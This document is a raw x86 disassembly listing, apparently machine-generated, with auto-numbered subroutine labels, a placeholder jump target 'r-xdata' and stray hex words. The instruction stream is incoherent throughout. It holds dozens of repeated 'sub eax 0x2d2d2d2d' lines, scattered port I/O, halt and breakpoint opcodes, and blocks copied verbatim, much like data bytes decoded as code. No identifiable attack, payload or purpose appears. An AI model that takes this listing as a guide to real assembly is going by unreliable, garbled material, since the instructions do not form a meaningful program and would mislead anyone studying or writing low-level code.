sub eax 0x2d2d2d2d
mov dl 0x38
daa
jl r-xdata
out dx al
xlat
mov ecx 0x688754ee
inc edx
inc edx
sub eax 0x38b27438
out 0xb6 eax
mov ebp 0x42f054bd
inc edx
inc edx
sub eax 0xb22d2d2d
sub [ ebp + 0x74 ] bh
jle r-xdata
inc edx
sub eax 0x34db2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x5444362d
loope r-xdata
push ecx
mov cl 0xd7
mov ch 0x30
clc
dec ecx
xlat
mov ebp 0x4ea255ed
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xf0
jg r-xdata
jl r-xdata
inc edx
inc edx
push esp
adc [ eax + 0x42 ] 0x42
sub eax 0x42015a55
inc edx
push esp
push ecx
mov bl 0xbd
mov ebp 0xb4d538b2
mov ebp 0x55f830bd
in eax dx
jmp r-xdata
dec esi
int3
mov dl 0xbd
mov ebp 0x15754e4
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x732438b2
inc edx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
mov ecx 0x30bdbdbc
cmp cl al
inc eax
inc edx
inc edx
push esp
add eax 0x2d42426b
sub eax 0x2d2d2d2d
sub eax 0xdfd72d2d
sub_48ca05
xor al 0xf8
dec ecx
in eax 0xdb
xor al 0xf8
dec ebx
push esp
push cs
mov edx 0x2d2dbdbd
sub eax 0x2d2d2d2d
sub eax 0xf8302d2d
cmp eax 0xd7eeeeed
mov ecx 0x688754ee
inc edx
inc edx
sub eax 0x38b27438
out 0xb6 eax
mov ebp 0x42f054bd
inc edx
inc edx
sub eax 0xb22d2d2d
sub [ ebp + 0x74 ] bh
jle r-xdata
sub eax 0x34db2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x5444362d
loope r-xdata
push ecx
mov cl 0xd7
mov ch 0x30
clc
dec ecx
xlat
mov ebp 0x4ea255ed
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xf0
jg r-xdata
jl r-xdata
inc edx
inc edx
push esp
adc [ eax + 0x42 ] 0x42
sub eax 0x42015a55
inc edx
push esp
push ecx
mov bl 0xbd
mov ebp 0xb4d538b2
mov ebp 0x55f830bd
in eax dx
jmp r-xdata
dec esi
int3
mov dl 0xbd
mov ebp 0x15754e4
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x732438b2
inc edx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
mov ecx 0x30bdbdbc
cmp cl al
inc eax
inc edx
inc edx
push esp
add eax 0x2d42426b
sub eax 0x2d2d2d2d
sub eax 0xdfd72d2d
sub_48cb9e
sub [ ebx + 0x42 ] dh
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbdbdbcd5
cmp eax 0x42ade034
sub al [ ebp - 0x43 ]
mov ebp 0xb27d38bd
cmp [ ecx + edi * 2 ] dh
inc edx
inc edx
inc edx
enter 0x36b1 0xf0
mov ch 0x30
enter 0x55ad 0xa1
mov esi 0xd354bdbd
dec ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf9422d2d
cdq
test eax 0xa999f936
xchg dl bh
mov ecx 0xaf2a3fb2
mov ebp 0x547d8ebd
xor eax 0x2dbdbdb7
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x34ea2d2d
clc
xor al bh
push ecx
in eax dx
out dx al
out dx al
jpo r-xdata
push ecx
add eax 0xd74cf87a
mov ebp 0x4054bdd7
jae r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x342d2d2d
or [ ebp + 0x40 ] ch
inc edx
inc edx
cmp [ ebp + 0x54 ] bh
scasb [ edi ]
jl r-xdata
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx
jmp r-xdata
pop ebp
outsb
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xb1
stosd [ edi ]
r-xdata
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
push eax
mov fs [ esi + 0x30 ]
clc
inc ecx
in eax dx
out dx al
out dx al
xor al 0xf8
sub eax 0xb22d2d2d
cmp [ edi ] ch
fstp [ eax ]
je r-xdata
lodsd [ esi ]
mov ebp 0x7e7d8ebd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x36e82d2d
push ecx
cmp al 0x51
adc [ ecx - 0x15144243 ] edi
inc ebp
aad 0xb9
mov esp 0x5d54bdbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x38b22d2d
das
cmp [ esp + esi * 4 - 0x43 ] dl
mov ebp 0x2d2d7ee3
sub eax 0x34db2d2d
clc
inc edi
xlat
fsub st5
push esp
lds ebx [ edi + 0x42 ]
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
xor cl bh
lea esp [ ebp - 0x42404a2b ]
mov ebp 0x4271bb54
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbb38b22d
mov ebp 0xab2bdbd
lodsb [ esi ]
r-xdata
sub_48cdc5
sti
mov ebp 0xb2be8130
cmp [ ecx + 0x3e42425b ] ecx
rcr [ ecx + 0x39b2bca9 ] 0x94
pop ebx
inc edx
inc edx
push esp
in al 0xb4
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x30b77dd6
stc
lodsd [ esi ]
insd
mov dl 0xa
lodsb [ esi ]
r-xdata
push esp
loope r-xdata
aas
add edi [ ebx - 0x7bd4243 ]
inc ecx
rol [ ecx - 0x42 ] 0xb2
aas
adc eax 0x35bdbdbb
clc
or eax 0x354df835
clc
pop ebp
xor eax 0x9d546df8
lodsb [ esi ]
mov ebp 0xeaea2dbd
push esp
sbb ch [ ecx - 0x28d24243 ]
cli
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xb1793e2d
cmp [ esi - 0x4e ] ah
cmp [ ebp + 0x54bdbdb6 ] esi
dec esp
inc edx
inc edx
sub eax 0x2d2d2d2d
out dx al
jmp r-xdata
sub_48ce79
xor al 0xe8
daa
out 0x54 eax
cli
lodsd [ esi ]
mov ebp 0x2d2d2dbd
sub eax 0xb22d2d2d
cmp [ edx - 0x12424243 ] bh
inc edx
enter 0x4259 0xea
loope r-xdata
mov ecx 0x2d2dbdbd
sub eax 0x2d2d2d2d
sub eax 0x5e3542d
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xe834db2d
popad
out 0x54 eax
pop edi
insd
inc edx
inc edx
sub eax 0x55ed2d2d
hlt
sub_48cf0a
mov ah 0xbd
mov ebp 0xeab5c842
inc edx
sub ebp [ ecx ]
mov ebp 0xf834bdbd
inc ecx
cmp [ ebp - 0x4e ] bh
cmp [ esi ] edx
jb r-xdata
cdq
movsd [ edi ] [ esi ]
test cl bh
cdq
movsd [ edi ] [ esi ]
mov dl 0x3f
sub [ edi + 0xab2bdbd ] 0xfffffffe
mov eax [ 0x425b5954 ]
inc edx
sub eax 0x36b5f036
clc
inc ecx
test eax 0x556cbe3b
cli
inc edx
inc edx
push esp
stc
pop ebx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xad513e2d
xlat
fsubr st5
push esp
out 0xb eax
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x552a422d
mov ebp 0x793ebdbd
test [ ecx + 0x57 ] edx
inc edx
inc edx
sub eax 0x554ea2d
dec ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x545136e8
mov edi 0x2d424206
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x34db2d2d
stc
cdq
and ebp 0x34dbd8d7
stc
cdq
and ebp 0xffffffd7
rcr ebx cl
xor al 0xf9
cdq
std
in eax 0xd7
mov esp 0x99f934db
dec [ esi + 0x30eded7d ]
xor [ ecx - 0x424242df ] ebx
in al dx
xor cl dh
cdq
cmc
in al dx
in eax dx
inc edx
in eax dx
0x36ddeb42 0x3865
sub_48d009
xor al 0xf9
cdq
in eax 0x42
sub ebx [ ecx - 0x43 ]
mov ebp 0x3dbdd5bd
mov ebp 0x42bdd7bd
leave
cdq
movsd [ edi ] [ esi ]
push esp
mov al [ edx + 0x42 ]
inc edx
mov dl 0x3
xchg [ esi + 0x65425472 ] edi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x552d2d2d
test al 0xb6
mov ebp 0x4f954bd
inc edx
inc edx
add edx [ ecx - 0x71424241 ]
jmp r-xdata
mov fs [ esi - 0x25 ]
xor al 0xe0
scasd [ edi ]
sub_48d0cd
xor al 0xe0
sbb eax 0x6436ced7
push esp
jl r-xdata
0xbdb7b655 0x36bd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x6ce739b2
inc edx
inc edx
aad 0xbd
lodsd [ esi ]
mov ebp 0x736754bd
inc edx
inc edx
push ebp
cmc
loopne r-xdata
cmp [ ebp + 0x54 ] bh
pop esp
inc edx
inc edx
inc edx
sub eax 0x7d8ee42d
push esp
lea edi [ ebx + 0x2d2dbdbd ]
sub eax 0x2d2d2d2d
sub eax 0xf834db2d
popfd
jpo r-xdata
inc edx
inc edx
r-xdata
xor al 0xf8
lahf
push esp
mov dh 0x56
inc edx
inc edx
cmp [ gs : esi + 0x54 ] ah
jmp r-xdata
xchg ebx eax
jecxz r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe393d72d
xlat
fcom [ eax + eax * 8 + 0x42 ]
inc edx
inc edx
sub eax 0x66542d2d
popad
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x252a422d
mov ebp 0xe084bdbd
mov cl 0x54
dec eax
jo r-xdata
sub eax 0xf065f87a
aam 0xde
iretd
inc edx
xlat
sub_48d24c
mov ecx 0x2d993930
mov ebp 0x4f55bdbd
popad
inc edx
inc edx
stc
cdq
lodsd [ esi ]
inc edx
lea edi [ eax - 0x424242c7 ]
in eax dx
xor [ ecx ] bh
cdq
and eax 0xedbdbdbd
push ebp
outsb
outsd
inc edx
inc edx
r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2b422d2d
add eax 0x38bdbdbd
jge r-xdata
cmp [ ebp - 0x4e ] bh
cmp [ ebx ] ebp
inc eax
je r-xdata
cmp [ eax + 0x40 ] esi
inc edx
inc edx
jmp 0x7f877fe5
inc edx
inc edx
xlat
shl ch cl
xlat
int 0x54
out dx eax
inc eax
inc edx
inc edx
sub eax 0x362d2d2d
jmp r-xdata
inc edx
sub eax 0x2d2d2d2d
sub eax 0x7a2d2d2d
clc
inc edx
inc edx
in al 0xe4
push esp
mov bl 0x75
inc edx
sub_48d7e9
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
in eax 0xdb
xor al 0xf8
inc ebp
push esp
push esp
add eax [ edx + 0x42 ]
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x5136e82d
in al dx
fadd [ ecx - 0x43 ]
jmp r-xdata
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x42589c54
inc edx
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xf8
cmpsd [ esi ] [ edi ]
in eax 0xd7
rcr ebx cl
xor al 0xf8
mov eax [ 0x34db7f36 ]
clc
mov [ 0x455154e5 ] eax
inc edx
inc edx
sub eax 0xbd013b36
mov ebp 0x73db54bd
inc edx
inc edx
sub eax 0x2d2d2d2d
out dx al
in eax dx
push esp
les eax [ esi ]
inc edx
inc edx
sub eax 0x71f0be2d
in eax dx
xor al 0x35
or eax 0x54bdbdbd
cmp al 0xb5
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe42d2d2d
xlat
enter 0x34db 0xf0
mov ebp 0xf5c54bd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x364b8e2d
jae r-xdata
loopne r-xdata
bound ebp [ esi + 0x46 ]
r-xdata
sub eax 0x2d2d2d2d
sub eax 0x73364b8e
bound ebp [ ss : esi + 0x46 ]
xlat
rcl [ edi + 0xa ] cl
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
or eax 0xdbe46536
xor al 0xe0
pand mm6 [ eax + esi * 8 ]
jpo r-xdata
push [ 0x3e1aa8e1 ]
inc ebx
popfd
mov dl 0x3f
push esp
inc edx
inc edx
inc edx
inc edx
clc
inc ecx
rol [ ecx - 0x42 ] 0xb2
aas
mov bl 0x78
inc edx
inc edx
xor eax 0xf83509f8
pop ecx
push esp
mov eax [ 0x2d424258 ]
jns r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdbc8d7e4
xor al 0xf0
aam 0x36
arpl sp sp
push esp
xor al 0x77
inc edx
inc edx
sub eax 0xb27d38e4
cmp [ esi + 0x66 ] ch
inc edx
inc edx
push esp
retn 0x4274
sub_48d8f6
xor al 0xe0
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdbc8d7e4
xor al 0xf0
jns r-xdata
aam 0x36
arpl sp sp
push esp
xor al 0x77
inc edx
inc edx
sub eax 0xb27d38e4
cmp [ esi + 0x66 ] ch
inc edx
inc edx
push esp
retn 0x4274
mov ebp 0xf5c54bd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x364b8e2d
jae r-xdata
loopne r-xdata
bound ebp [ esi + 0x46 ]
r-xdata
sub eax 0x2d2d2d2d
sub eax 0x73364b8e
bound ebp [ ss : esi + 0x46 ]
xlat
rcl [ edi + 0xa ] cl
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
or eax 0xdbe46536
xor al 0xe0
pand mm6 [ eax + esi * 8 ]
jpo r-xdata
push [ 0x3e1aa8e1 ]
inc ebx
popfd
mov dl 0x3f
push esp
inc edx
inc edx
inc edx
inc edx
clc
inc ecx
rol [ ecx - 0x42 ] 0xb2
aas
mov bl 0x78
inc edx
inc edx
xor eax 0xf83509f8
pop ecx
push esp
mov eax [ 0x2d424258 ]
sub_48d991
xor al 0xf8
jl r-xdata
xor al 0xe0
mov ebp 0x2754d3d7
xor al 0xf8
jpo r-xdata
or al [ edx + 0x42 ]
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
daa
xor al 0xf8
popad
in eax 0xd7

sub_48da17
xor al 0xe8
jpo r-xdata
add ebp ebp
push esp
mov al 0x4c
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xe834db2d
jns r-xdata
xlat
aam 0x54
pop es
ja r-xdata
inc ebp
outsd
cmp [ esi ] ch
pop ebx
inc edx
sub eax 0xc936428e
add [ ecx - 0x72 ] bl
je r-xdata
inc edx
inc edx
push esp
mov esi 0x2d42425a
sub eax 0xe834db2d
push [ esi ]
push esp
mov dl 0x38
pop ebx
loopne r-xdata
stc
inc esi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x3e5136e8
push ecx
mov eax [ 0xffffffffd7e5d9d7 ]
0x34db
imul ebp [ ss : esi + 0x47 ] 0x42
clc
dec ecx
r-xdata
clc
sbb eax 0x557b36ed
and [ ebp + 0x42 ] cl
inc edx
in al 0x38
jge r-xdata
xor eax 0x3e79a0e9
inc esp
popfd
mov dl 0x3f
pop ebx
inc edx
inc edx
inc edx
push esp
push ecx
or eax [ edx + 0x42 ]
jmp r-xdata
rcr [ ebp - 0x72 ] 0x42
cmp [ eax + 0xf ] al
inc edx
inc edx
xor al bh
jl r-xdata
sub_48da4c
push esp
push edi
inc ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x813edb2d
lodsb [ esi ]
mov ebp 0x5b2e38b2
inc edx
inc edx
push esp
mov esi 0x2d42425a
sub eax 0xe834db2d
push [ esi ]
push esp
stc
inc esi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x3e5136e8
push ecx
mov eax [ 0xffffffffd7e5d9d7 ]
0x34db
sub_48daac
inc edx
sub eax 0x2d2d2d2d
sub eax 0x853edb2d
mov ebp 0x6a5838b2
inc edx
inc edx
xchg esi eax
jl r-xdata
adc eax 0x2dbdbdbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
in al 0xd9
mov esp 0x34b5fd36
inc ebp
jle r-xdata
clc
inc ecx
clc
inc ecx
push esp
xor edx [ eax ]
inc edx
inc edx
xor al bh
jge r-xdata
mov esp 0x34b5fd36
xlat
mov esp 0xbb1954eb
mov ebp 0x170954bd
inc edx
inc edx
sub eax 0xc842ed2d
mov ch 0x54
pop esp
push edi
inc edx
inc edx
sub eax 0xedbcfa30
mov dl 0xb
mov edx 0x777a3ced
mov ebp 0xd254bdbd
outsd
inc edx
inc edx
sub eax 0x65f834db
in eax 0x54
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
mov dl 0x38
sahf
inc edx
inc edx
clc
mov ch 0xe0
jle r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x453e2d2d
mov esp 0x619438b2
inc edx
inc edx
inc edx
enter 0x36b1 0xf8
mov ch 0x42
in eax dx
fst [ ebp + eax * 8 + 0x5d ]
inc edx
sub eax 0x36d9e42d
sub eax 0x2d2d2d2d
sub eax 0x91eb42ed
push esp
mov [ 0x2d424254 ] eax
sub eax 0x2d2d2d2d
xor [ ecx ] bh
cdq
sub [ ebp - 0x28124243 ] edi
mov ebp 0xbdbd1554
mov ebp 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub_48db86
mov edx 0x2d2dbdbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x42384536
mov dl 0x38
dec eax
ja r-xdata
dec esi
inc edx
inc edx
in eax dx
push esp
push esp
ja r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xeaea2d2d
0x7f954ee 0x4242
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx
enter 0x3651 0x7a
push ebp
cmp al 0x61
inc edx
inc edx
push esp
inc ebx
dec ecx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x88542d2d
push ebx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x7c3e2d2d
mov edi 0x42737a54
inc edx
inc edx
inc edx
sub eax 0xb24d362d
or edi [ ebx + 0x470bb2ea ]
xchg esi eax
jpe r-xdata
ja r-xdata
cmp [ ecx - 0x69bdbd93 ] bl
dec esp
cmp [ edi - 0x4e ] ebp
cmp [ edi - 0x3bdbd93 ] esp
push esp
rcr [ esi + 0x42 ] 0x1
inc edx
sub eax 0x38f1eb42
jge r-xdata
sub eax 0x2d2d2d2d
sub eax 0xd9e42d2d
mov esp 0x34b5fd36
mov ebp 0x6fd254bd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xea2d2d2d
0xf954eeea 0x4207
inc edx
push esp
cmpsd [ esi ] [ edi ]
jge r-xdata
and edx [ eax ]
inc edx
inc edx
sub eax 0x362d2d2d
clc
inc ecx
xchg al bh
inc ebp
mov dl 0x3f
cmp ecx [ esi + 0x42 ]
clc
inc ecx
clc
inc ecx
push esp
xor edx [ eax ]
inc edx
inc edx
xor al bh
jge r-xdata
mov esp 0x34b5fd36
inc edx
inc edx
sub eax 0x65f834db
in eax 0x54
xlat
mov esp 0xbb1954eb
mov ebp 0x170954bd
inc edx
inc edx
sub eax 0xc842ed2d
mov ch 0x54
pop esp
push edi
inc edx
inc edx
sub eax 0xedbcfa30
mov dl 0xb
mov edx 0x777a3ced
mov ebp 0xd254bdbd
outsd
sub_48de30
push ebp
add eax 0xeb424262
aad 0x4c
mov al [ 0xffffffffe154fdd4 ]
add [ edx + 0x42 ] eax
sub eax 0x3342d2d
jns r-xdata
push ecx
push esp
aaa
dec esp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x793e2d2d
mov cl 0xd7
lodsd [ esi ]
xor cl bh
cdq
sub edx 0x426a9954
mov ebp 0x3d2334bd
mov ebp 0x4e55bdbd
pop eax
inc edx
inc edx
aad 0xe7
push edx
loop r-xdata
inc edx
sub eax 0x2d2d2d2d
sub eax 0x30add72d
clc
insd
jmp r-xdata
push esp
cdq
push 0x42
push esp
mov edi 0x2d424261
sub eax 0xb22d2d2d
cmp [ edx - 0x12424243 ] bh
inc edx
enter 0x4261 0xea
loope r-xdata
0x55edfb34 0x5858
xor al bh
imul ebp ebp 0x46e93830
inc edx
inc edx
in eax dx
push esp
jae r-xdata

sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x57c034db
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x382d2d2d
je r-xdata
sub eax 0x30ebeb2d
cmp cl cl
inc esi
inc edx
inc edx
in eax dx
jmp r-xdata
xlat
aad 0xe2
add edi [ edx + 0x42 ]
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xc0
push edi
outsd
inc edx
inc edx
sub eax 0x99f9422d
lodsd [ esi ]
rcr [ ecx - 0x17ab5653 ] 0xbd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x38b22d2d
not [ esi ]
inc edx
inc edx
std
push esp
scasd [ edi ]
mov edi 0x2d2dbdbd
sub eax 0x7d38748e
mov dl 0x24
jl r-xdata
mov gs [ gs : edi - 0x29 ]
jl r-xdata
inc edx
jle r-xdata
sub eax 0x2d2d2d2d
0x34db
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf834db2d
imul esi [ esi ] 0xf834db7b
imul esi [ esi ] 0x7e
push esp
aam 0x44
inc edx
inc edx
sub eax 0x52542d2d
inc ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x65362d2d
mov gs [ edi - 0x29 ]
sub_48dea3
mov dl 0x3b
aam 0x50
inc edx
inc edx
push esp
mov edi 0x2d424261
sub eax 0xb22d2d2d
cmp [ edx - 0x12424243 ] bh
inc edx
enter 0x4261 0xea
loope r-xdata
xor al bh
imul ebp ebp 0x46e93830
inc edx
inc edx
in eax dx
push esp
jae r-xdata

sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x57c034db
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x382d2d2d
je r-xdata
sub eax 0x30ebeb2d
cmp cl cl
inc esi
inc edx
inc edx
in eax dx
jmp r-xdata
xlat
aad 0xe2
add edi [ edx + 0x42 ]
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xc0
push edi
outsd
inc edx
inc edx
sub eax 0x99f9422d
lodsd [ esi ]
rcr [ ecx - 0x17ab5653 ] 0xbd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x38b22d2d
not [ esi ]
inc edx
inc edx
std
push esp
scasd [ edi ]
mov edi 0x2d2dbdbd
sub eax 0x7d38748e
mov dl 0x24
jl r-xdata
mov gs [ gs : edi - 0x29 ]
jl r-xdata
inc edx
jle r-xdata
sub eax 0x2d2d2d2d
0x34db
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf834db2d
imul esi [ esi ] 0xf834db7b
imul esi [ esi ] 0x7e
push esp
aam 0x44
inc edx
inc edx
sub eax 0x52542d2d
inc ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x65362d2d
mov gs [ edi - 0x29 ]
sub_48dfc0
push esp
nop
outsd
inc edx
inc edx
sub eax 0x99f9422d
lodsd [ esi ]
rcr [ ecx - 0x17ab5653 ] 0xbd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x38b22d2d
not [ esi ]
inc edx
inc edx
std
push esp
scasd [ edi ]
mov edi 0x2d2dbdbd
sub eax 0x7d38748e
mov dl 0x24
jl r-xdata
mov gs [ gs : edi - 0x29 ]
jl r-xdata
inc edx
jle r-xdata
sub eax 0x2d2d2d2d
0x34db
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf834db2d
imul esi [ esi ] 0xf834db7b
imul esi [ esi ] 0x7e
push esp
aam 0x44
inc edx
inc edx
sub eax 0x52542d2d
inc ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x65362d2d
mov gs [ edi - 0x29 ]
sub_48e081
inc eax
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x8ee42d2d
jge r-xdata
push esp
push es
jl r-xdata
xlat
inc edx
xor al 0xc0
inc ecx
inc edx
sub esi [ ecx ]
mov ebp 0xc084bdbd
inc ecx
mov dl 0x39
xchg [ edx + eax * 2 ] al
inc edx
0xf830b9d7 0xed45
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub_48e0ce
xor al 0xe8
imul edx [ esi + 0x7f ] 0x42
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
xlat
inc edx
xor al 0xc0
inc ecx
inc edx
sub esi [ ecx ]
mov ebp 0xc084bdbd
inc ecx
mov dl 0x39
xchg [ edx + eax * 2 ] al
inc edx
0xf830b9d7 0xed45
sub_48e11f
xlat
mov [ 0x42420254 ] al
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x99c942ee
movsd [ edi ] [ esi ]
push esp
dec ebp
arpl [ edx + 0x42 ] ax
sub eax 0x2d2d2d2d
sub eax 0xc8e6d52d
aaa
dec ebp
0x55f1fb34 0x5f4a
sub_48e193
dec ecx
mov esi 0x55ecb5f8
sahf
sbb eax [ edx + 0x42 ]
push esp
add eax 0x2d424276
cmp eax 0xb2bdb9c2
cmp edi [ edi + 0x50 ]
inc edx
inc edx
fstp [ ecx - 0x6cf4267 ]
cdq
cdq
in eax dx
mov dl 0xa
mov edx 0xfa36dbed
mov edi 0x99f9bedb
popfd
mov dl 0xa
jge r-xdata
jpo r-xdata
mov ebp 0x5dc842ee
push esp
dec ebp
and [ ebp + 0x42 ] ch
inc edx
r-xdata
